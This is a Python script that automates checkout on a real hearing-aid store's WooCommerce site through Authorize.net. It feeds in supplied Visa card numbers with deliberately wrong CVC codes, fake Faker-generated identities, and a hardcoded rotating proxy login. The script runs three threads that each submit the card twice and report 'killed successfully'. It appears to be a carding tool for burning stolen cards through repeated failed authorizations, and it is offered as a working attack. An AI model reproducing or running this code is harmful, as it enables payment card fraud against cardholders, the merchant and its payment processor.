import asyncio
import threading
import queue
import httpx
import random
import json
from faker import Faker
import urllib.parse
import time
from user_agent import generate_user_agent

def get_usa_address():
    fake = Faker('en_US')
    full_name = fake.name().split()
    first_name = full_name[0]
    last_name = " ".join(full_name[1:]) if len(full_name) > 1 else ""

    address = {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": fake.street_address(),
        "city": fake.city(),
        "state": fake.state_abbr(),
        "zip": fake.zipcode(),
        "email" : fake.email()
    }
    return address

def get_number(exclude):
    numbers = [i for i in range(100, 1000) if i != exclude]
    return str(random.choice(numbers))

async def ck(cc:str):
    num,mm,yy,cvc = cc.split("|")
    if not num.startswith('4'):
        return 'Only Visa Card Allowed'
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    last4 = num[-4:]
    user = generate_user_agent()  # for headers
    user2 = urllib.parse.quote_plus(user)
    headers1 = {'user-agent': user}
    username = "sf30p9orymc24y0"
    password = "h5t0p437lspawbq"
    proxy = "http://{}:{}@rp.scrapegw.com:6060".format(username, password)
    transport = httpx.AsyncHTTPTransport(proxy=proxy)
    try:
        async with httpx.AsyncClient(transport=transport, timeout=30) as ses:
            await ses.get("https://budgethearingaids.com/shop/",headers=headers1)
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://budgethearingaids.com',
                'priority': 'u=1, i',
                'referer': 'https://budgethearingaids.com/shop/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'add_to_cart',
            }

            data = {
                'success_message': '“Used Nearly Invisible Premium Rechargeable OTC Hearing Aids Pair” has been added to your cart',
                'product_sku': 'HLT-FIO',
                'product_id': '23387',
                'quantity': '1',
            }

            await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
            headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'priority': 'u=0, i',
            'referer': 'https://budgethearingaids.com/shop/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
            await ses.get('https://budgethearingaids.com/cart/', headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://budgethearingaids.com/cart/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user,
            }
            chkout = await ses.get('https://budgethearingaids.com/checkout/', headers=headers)
            print(chkout)
            uorn = chkout.text.split('"update_order_review_nonce":"')[1].split('"')[0]
            cpn = chkout.text.split('<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://budgethearingaids.com',
                'priority': 'u=1, i',
                'referer': 'https://budgethearingaids.com/checkout/',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'update_order_review',
                'nocache': str(time.time()),
            }
            address = get_usa_address()
            fn = address['first_name']
            ln = address['last_name']
            add = address['address_line1']
            email = address['email']
            city = urllib.parse.quote('New York')
            en_street = add.replace(' ','+')
            en_email = urllib.parse.quote(email)
            data = {
                'security': str(uorn),
                'payment_method': 'authorize_net_cim_credit_card',
                'billing_email': email,
                'company': '',
                'country': 'US',
                'state': 'NY',
                'postcode': '10080',
                'city': 'New York',
                'address': add,
                'address_2': '',
                's_company': '',
                's_country': 'US',
                's_state': 'NY',
                's_postcode': '10080',
                's_city': 'New York City',
                's_address': add,
                's_address_2': '',
                'has_full_address': 'true',
                'bill_to_different_address': 'same_as_shipping',
                'post_data': f'billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_company=&shipping_address_1={en_street}&shipping_address_2=&shipping_country=US&shipping_postcode=10080&shipping_state=NY&shipping_city=New+York&shipping_phone=5726548585&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fbudgethearingaids.com%2Fshop%2F&wc_order_attribution_session_start_time=2025-06-25+05%3A40%3A56&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&shipping_method%5B0%5D=fedex%3A7%3AGROUND_HOME_DELIVERY&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry=&wc-authorize-net-cim-credit-card-payment-nonce=&wc-authorize-net-cim-credit-card-payment-descriptor=&wc-authorize-net-cim-credit-card-last-four=&wc-authorize-net-cim-credit-card-card-type=&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_address_1={en_street}&billing_address_2=&billing_country=US&billing_postcode=10080&billing_state=NY&billing_city=New+York&billing_phone=5726548585&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D{str(time.time())}',
                'cfw': 'true',
            }

            uor = await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
            for _ in range(2):
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Origin': 'https://budgethearingaids.com',
                    'Referer': 'https://budgethearingaids.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': user,
                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                }

                json_data = {
                    'securePaymentContainerRequest': {
                        'merchantAuthentication': {
                            'name': '94Q28cAkR',
                            'clientKey': '55dcE5TSwN6aC62Zvexmcz79vP6bPzm3Q3J32K8HrCuLPV325C5Nt29hx3PM92yM',
                        },
                        'data': {
                            'type': 'TOKEN',
                            'id': '0d1dcae5-fd58-a69d-0ee5-6e4f532480e7',
                            'token': {
                                'cardNumber': str(num),
                                'expirationDate': f'{mm}{yy}',
                                'cardCode': get_number(cvc),
                                'zip': '10080',
                                'fullName': f'{fn} {ln}',
                            },
                        },
                    },
                }

                cctoken = await ses.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
                cctok = cctoken.text.split('"dataValue":"')[1].split('"')[0]
                headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://budgethearingaids.com',
                    'priority': 'u=1, i',
                    'referer': 'https://budgethearingaids.com/checkout/',
                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': user,
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {
                    'wc-ajax': 'checkout',
                }

                data = f'billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_company=&shipping_address_1={en_street}&shipping_address_2=&shipping_country=US&shipping_postcode=10080&shipping_state=NY&shipping_city=New+York&shipping_phone=5726548585&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbudgethearingaids.com%2Fshop%2F&wc_order_attribution_session_start_time=2025-06-25+05%3A40%3A56&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&shipping_method%5B0%5D=fedex%3A7%3AGROUND_HOME_DELIVERY&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={mm}+%2F+{yy1}&wc-authorize-net-cim-credit-card-payment-nonce={cctok}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four={last4}&wc-authorize-net-cim-credit-card-card-type=visa&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_address_1={en_street}&billing_address_2=&billing_country=US&billing_postcode=10080&billing_state=NY&billing_city=New+York&billing_phone=5726548585&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D{time.time()}'

                response = await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
                print(response)
            return "killed successfully"
    except Exception as e:
        print(e)
        return f'Error ; {e}'

result_queue = queue.Queue()

def worker(cc: str):
    """Thread worker running async ck()"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(ck(cc))
        result_queue.put(result)
    except Exception as e:
        result_queue.put(f"Error: {str(e)}")
    finally:
        loop.close()

def ck1(cc: str, num_threads=3):
    """Run 5 threads on the same CC"""
    threads = []
    print(f"Processing {cc[:12]}... in {num_threads} threads")
    
    # Start threads
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(cc,))
        t.start()
        threads.append(t)
    
    # Wait for completion
    for t in threads:
        t.join()
    
    # Get results
    results = []
    while not result_queue.empty():
        results.append(result_queue.get())
    
    if 'killed successfully' in results:
        return "killed"
    else:
        return "failed"
